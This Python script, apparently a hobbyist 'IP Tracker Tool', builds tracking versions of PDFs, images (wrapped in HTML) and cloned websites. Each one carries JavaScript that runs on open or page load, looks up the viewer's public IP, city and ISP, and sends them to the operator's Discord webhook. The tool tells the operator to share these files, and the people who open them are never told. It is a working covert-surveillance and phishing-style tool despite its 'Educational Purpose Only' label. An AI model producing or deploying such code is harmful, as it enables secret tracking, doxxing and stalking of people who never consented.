#!/usr/bin/env python3
import os
import sys
import subprocess
import venv
from pathlib import Path
import logging
import json
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import tkinter as tk
from tkinter import filedialog

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
console = Console()

def select_file(title="Select File", filetypes=None):
    """Open file picker dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.askopenfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def select_save_file(title="Save File As", filetypes=None):
    """Open save file dialog and return selected file path"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.asksaveasfilename(title=title, filetypes=filetypes)
    return file_path if file_path else None

def get_venv_python():
    """Get the Python executable path from virtual environment."""
    if sys.platform == "win32":
        return "venv\\Scripts\\python.exe"
    return "venv/bin/python"

def check_venv():
    """Check if virtual environment exists and is valid."""
    venv_path = Path("venv")
    if not venv_path.exists():
        return False
    
    python_executable = get_venv_python()
    if not os.path.exists(python_executable):
        return False
    
    try:
        # Try to import all required packages to verify the environment
        subprocess.check_call([python_executable, "-c", "import requests; import PyPDF2; import bs4; import rich"])
        return True
    except subprocess.CalledProcessError:
        return False

def install_package(pip_executable, python_executable, package):
    """Install a package with error handling."""
    try:
        console.print(f"[yellow]Installing {package}...[/yellow]")
        subprocess.check_call([pip_executable, "install", "--no-cache-dir", package])
        console.print(f"[green]Successfully installed {package}[/green]")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[red]Error installing {package}: {str(e)}[/red]")
        # Try alternative installation method
        try:
            console.print(f"[yellow]Trying alternative installation method for {package}...[/yellow]")
            subprocess.check_call([python_executable, "-m", "pip", "install", "--no-cache-dir", package])
            console.print(f"[green]Successfully installed {package} using alternative method[/green]")
            return True
        except subprocess.CalledProcessError as e2:
            console.print(f"[red]Failed to install {package} with alternative method: {str(e2)}[/red]")
            return False

def setup_environment():
    """Set up the virtual environment and install requirements."""
    try:
        # Check if virtual environment exists and is valid
        if check_venv():
            console.print("[green]Using existing virtual environment...[/green]")
            return get_venv_python()
        
        # Create new virtual environment if needed
        venv_path = Path("venv")
        console.print("[yellow]Creating new virtual environment...[/yellow]")
        venv.create("venv", with_pip=True)
        
        # Get the correct Python executable path
        python_executable = get_venv_python()
        pip_executable = "venv\\Scripts\\pip.exe" if sys.platform == "win32" else "venv/bin/pip"
        
        # Upgrade pip first
        console.print("[yellow]Upgrading pip...[/yellow]")
        subprocess.check_call([python_executable, "-m", "pip", "install", "--upgrade", "pip"])
        
        # Install required packages with specific versions
        console.print("[yellow]Installing required packages...[/yellow]")
        packages = [
            "requests==2.31.0",
            "PyPDF2==3.0.1",
            "beautifulsoup4==4.12.2",
            "rich==13.7.0"
        ]
        
        for package in packages:
            if not install_package(pip_executable, python_executable, package):
                console.print(f"[red]Failed to install {package}. Please check your Python version and try again.[/red]")
                return None
        
        # Verify installations
        console.print("[yellow]Verifying package installations...[/yellow]")
        try:
            subprocess.check_call([python_executable, "-c", "import requests; import PyPDF2; import bs4; import rich"])
            console.print("[green]All packages installed successfully![/green]")
        except subprocess.CalledProcessError as e:
            console.print(f"[red]Error verifying package installations: {str(e)}[/red]")
            return None
        
        return python_executable
    except Exception as e:
        console.print(f"[red]Error during setup: {str(e)}[/red]")
        return None

def run_in_venv():
    """Run the script in the virtual environment."""
    python_executable = setup_environment()
    if not python_executable:
        console.print("[red]Failed to set up the environment. Please check your Python installation and try again.[/red]")
        sys.exit(1)
    
    # Get the current script path
    script_path = os.path.abspath(__file__)
    
    # Run the script in the virtual environment
    console.print("[green]Starting IP Tracker Tool in virtual environment...[/green]")
    subprocess.call([python_executable, script_path, "--in-venv"])

def load_config():
    """Load configuration from config.json"""
    config_path = Path("config.json")
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading config: {str(e)}")
    return {"webhook_url": None}

def save_config(config):
    """Save configuration to config.json"""
    try:
        with open("config.json", 'w') as f:
            json.dump(config, f)
    except Exception as e:
        logger.error(f"Error saving config: {str(e)}")

def get_webhook_url():
    """Get webhook URL from config or user input"""
    config = load_config()
    if config.get("webhook_url"):
        if Confirm.ask("\n[bold blue]Use existing webhook URL?[/bold blue]"):
            return config["webhook_url"]
    
    while True:
        webhook_url = Prompt.ask("\n[bold blue]Enter your Discord webhook URL[/bold blue]")
        if webhook_url.startswith('https://discord.com/api/webhooks/'):
            config["webhook_url"] = webhook_url
            save_config(config)
            return webhook_url
        console.print("[red]Invalid webhook URL. Please enter a valid Discord webhook URL.[/red]")

def show_file_location(file_path):
    """Show the full path of the created file"""
    full_path = os.path.abspath(file_path)
    console.print("\n[bold green]Created File Location:[/bold green]")
    console.print(f"[yellow]{full_path}[/yellow]")
    console.print("\n[bold blue]You can now share this file to track IP addresses.[/bold blue]")

def create_tracking_pdf(original_pdf, webhook_url):
    """Create a PDF that tracks IP when opened"""
    try:
        # Create a copy of the original PDF
        output_pdf = f"tracking_{os.path.basename(original_pdf)}"
        
        # Create a JavaScript tracking script
        tracking_script = f"""
var trackingScript = function() {{
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.ipify.org?format=json', true);
    xhr.onload = function() {{
        if (xhr.status === 200) {{
            var data = JSON.parse(xhr.responseText);
            var publicIP = data.ip;
            
            // Get location info
            var xhr2 = new XMLHttpRequest();
            xhr2.open('GET', 'http://ip-api.com/json/' + publicIP, true);
            xhr2.onload = function() {{
                if (xhr2.status === 200) {{
                    var details = JSON.parse(xhr2.responseText);
                    var message = "PDF Opened - IP Information:\\n";
                    message += "Public IP: " + publicIP + "\\n";
                    
                    if (details.status === 'success') {{
                        message += "Location: " + details.city + ", " + details.country + "\\n";
                        message += "ISP: " + details.isp + "\\n";
                    }}
                    
                    // Send to Discord
                    var xhr3 = new XMLHttpRequest();
                    xhr3.open('POST', '{webhook_url}', true);
                    xhr3.setRequestHeader('Content-Type', 'application/json');
                    xhr3.send(JSON.stringify({{ content: message }}));
                }}
            }};
            xhr2.send();
        }}
    }};
    xhr.send();
}};

// Execute tracking when PDF is opened
trackingScript();
"""
        
        # Create a PDF with embedded JavaScript
        from PyPDF2 import PdfReader, PdfWriter
        reader = PdfReader(original_pdf)
        writer = PdfWriter()
        
        # Copy all pages from original PDF
        for page in reader.pages:
            writer.add_page(page)
        
        # Add JavaScript to the PDF
        writer.add_js(tracking_script)
        
        # Save the modified PDF
        with open(output_pdf, 'wb') as output_file:
            writer.write(output_file)
        
        console.print(f"[green]Successfully created tracking PDF![/green]")
        console.print("\n[bold yellow]Important:[/bold yellow]")
        console.print("1. Share the [bold]tracking_*.pdf[/bold] file directly")
        console.print("2. When someone opens this PDF on any device, it will automatically send tracking information to your Discord webhook")
        show_file_location(output_pdf)
        return output_pdf
    except Exception as e:
        console.print(f"[red]Error creating tracking PDF: {str(e)}[/red]")
        return None

def create_tracking_image(original_image, webhook_url):
    """Create an image that tracks IP when opened"""
    try:
        # Create a copy of the original image
        output_image = f"tracking_{os.path.basename(original_image)}"
        
        # Create an HTML file that displays the image and includes tracking
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body {{ margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }}
        img {{ max-width: 100%; max-height: 100vh; }}
    </style>
</head>
<body>
    <img src="{os.path.basename(original_image)}" alt="Image">
    <script>
        async function trackIP() {{
            try {{
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const publicIP = data.ip;
                
                const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
                const details = await detailsResponse.json();
                
                let message = "Image Opened - IP Information:\\n";
                message += `Public IP: ${{publicIP}}\\n`;
                
                if (details.status === 'success') {{
                    message += `Location: ${{details.city}}, ${{details.country}}\\n`;
                    message += `ISP: ${{details.isp}}\\n`;
                }}
                
                await fetch('{webhook_url}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ content: message }})
                }});
            }} catch (error) {{
                console.error('Tracking error:', error);
            }}
        }}

        // Execute tracking when page loads
        window.addEventListener('load', trackIP);
    </script>
</body>
</html>
"""
        
        # Save the HTML file
        html_file = f"tracking_{os.path.splitext(original_image)[0]}.html"
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        # Copy the original image to the same directory as the HTML file
        import shutil
        shutil.copy2(original_image, os.path.dirname(html_file))
        
        console.print(f"[green]Successfully created tracking image![/green]")
        console.print("\n[bold yellow]Important:[/bold yellow]")
        console.print("1. Share the [bold]tracking_*.html[/bold] file")
        console.print("2. When someone opens this file on any device, it will:")
        console.print("   - Display the image")
        console.print("   - Send tracking information to your Discord webhook")
        show_file_location(html_file)
        return html_file
    except Exception as e:
        console.print(f"[red]Error creating tracking image: {str(e)}[/red]")
        return None

def create_tracking_website(url, webhook_url):
    """Create a cloned website that tracks IP when visited"""
    try:
        import requests
        from bs4 import BeautifulSoup
        
        # Get the website content
        response = requests.get(url)
        response.raise_for_status()
        
        # Parse the HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Add tracking script
        tracking_script = f"""
<script>
async function trackIP() {{
    try {{
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const publicIP = data.ip;
        
        const detailsResponse = await fetch(`http://ip-api.com/json/${{publicIP}}`);
        const details = await detailsResponse.json();
        
        let message = "Website Visited - IP Information:\\n";
        message += `Public IP: ${{publicIP}}\\n`;
        
        if (details.status === 'success') {{
            message += `Location: ${{details.city}}, ${{details.country}}\\n`;
            message += `ISP: ${{details.isp}}\\n`;
        }}
        
        await fetch('{webhook_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{ content: message }})
        }});
    }} catch (error) {{
        console.error('Tracking error:', error);
    }}
}}

// Execute tracking when page loads
window.addEventListener('load', trackIP);
</script>
"""
        # Add the tracking script to the HTML
        soup.body.append(BeautifulSoup(tracking_script, 'html.parser'))
        
        # Save the modified website
        output_file = "tracking_website.html"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        console.print(f"[green]Successfully created tracking website![/green]")
        show_file_location(output_file)
        return output_file
    except Exception as e:
        console.print(f"[red]Error creating tracking website: {str(e)}[/red]")
        return None

def show_menu():
    console.clear()
    console.print(Panel.fit(
        "[bold blue]IP Tracker Tool[/bold blue]\n"
        "[italic]Educational Purpose Only[/italic]",
        title="Welcome",
        border_style="blue"
    ))
    
    table = Table(show_header=False, box=None)
    table.add_row("1", "Create Tracking PDF")
    table.add_row("2", "Create Tracking Image")
    table.add_row("3", "Create Tracking Website")
    table.add_row("4", "Exit")
    console.print(table)
    
    while True:
        try:
            choice = Prompt.ask("\n[bold blue]Enter your choice[/bold blue]", choices=["1", "2", "3", "4"])
            return int(choice)
        except ValueError:
            console.print("[red]Please enter a valid number.[/red]")

def main():
    # Get webhook URL
    webhook_url = get_webhook_url()
    
    while True:
        choice = show_menu()
        
        if choice == 1:
            console.print("\n[bold blue]Select your PDF file...[/bold blue]")
            file_path = select_file(
                title="Select PDF File",
                filetypes=[("PDF files", "*.pdf"), ("All files", "*.*")]
            )
            if file_path and file_path.lower().endswith('.pdf'):
                create_tracking_pdf(file_path, webhook_url)
            else:
                console.print("[red]No valid PDF file selected.[/red]")
        
        elif choice == 2:
            console.print("\n[bold blue]Select your image file...[/bold blue]")
            file_path = select_file(
                title="Select Image File",
                filetypes=[
                    ("Image files", "*.png *.jpg *.jpeg *.gif *.bmp"),
                    ("All files", "*.*")
                ]
            )
            if file_path:
                create_tracking_image(file_path, webhook_url)
            else:
                console.print("[red]No valid image file selected.[/red]")
        
        elif choice == 3:
            url = Prompt.ask("\n[bold blue]Enter the website URL[/bold blue]")
            if url.startswith(('http://', 'https://')):
                create_tracking_website(url, webhook_url)
            else:
                console.print("[red]Invalid URL. Please enter a valid URL starting with http:// or https://[/red]")
        
        elif choice == 4:
            console.print(Panel.fit(
                "[bold green]Thank you for using IP Tracker Tool![/bold green]",
                title="Goodbye",
                border_style="green"
            ))
            break
        
        if Confirm.ask("\n[bold blue]Do you want to continue?[/bold blue]"):
            continue
        break

if __name__ == "__main__":
    main() 